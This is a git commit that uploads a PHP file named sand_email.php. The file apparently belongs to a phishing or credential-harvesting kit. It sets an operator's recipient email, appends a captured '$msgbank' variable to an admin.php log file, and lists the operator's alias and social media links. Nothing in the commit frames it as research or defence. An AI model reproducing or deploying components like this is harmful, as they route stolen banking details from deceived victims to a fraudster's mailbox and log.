962464bb66ddfb30fa5ebed77e0aa8dec44cb096
Antosensei <161124606+Antosensei@users.noreply.github.com>
2024-06-15 18:38:00 +0000

    Add files via upload

---
+++ system/sand_email.php
@@ -0,0 +1,19 @@
+<?php
+
+$yourmail  = 'depsuu@msize.space';
+
+
+$f = fopen("../../admin.php", "a");
+	fwrite($f, $msgbank);
+
+
+$My_Name = "Urochi" ; 
+
+$Name_page = "Urochi" ;
+
+$channel_youtube = "https://www.youtube.com/channel/UCLnz5ZLUsHccLgXVLa5vv9w";
+
+$My_Facebook = "facebook.com/xrabbit.phtml";
+
+
+?>
